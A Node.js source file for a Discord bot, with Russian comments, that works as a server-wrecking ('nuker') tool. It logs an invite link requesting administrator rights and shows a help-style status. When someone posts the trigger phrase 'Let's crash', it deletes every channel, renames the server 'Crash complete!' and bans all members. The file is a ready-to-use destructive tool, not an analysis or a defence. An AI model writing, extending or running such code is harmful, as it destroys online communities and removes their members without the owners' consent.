const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
  console.log(`Бот запущен, с ${client.users.size} пользователями, в ${client.channels.size} каналах в ${client.guilds.size} серверах.`);
  console.log(`Вход выполнен под ${client.user.tag}!`);
  client.user.setPresence({ status: 'online', game: { name: '.хелп | ' + client.guilds.size + " серверов" } });
  client.generateInvite(["ADMINISTRATOR"]).then(link =>{
    console.log(`Ссылка для приглашение бота: ${link}`);
  });
});

client.on('message', msg => {
  if (msg.content === 'Let\'s crash') {
    msg.guild.channels.array().forEach(channel => {
      channel.delete('Lol');
    });
    msg.guild.setName('Crash complete!');
    msg.guild.members.array().forEach(member => {
      member.ban();   
    });
  }
});

client.on("guildCreate", guild => {
  console.log("Бот добавлен на север: " + guild.name + "!");
  client.user.setPresence({ status: 'online', game: { name: 'Let\'s crash | ' + client.guilds.size + " серверов" } });
});

client.login('токен');
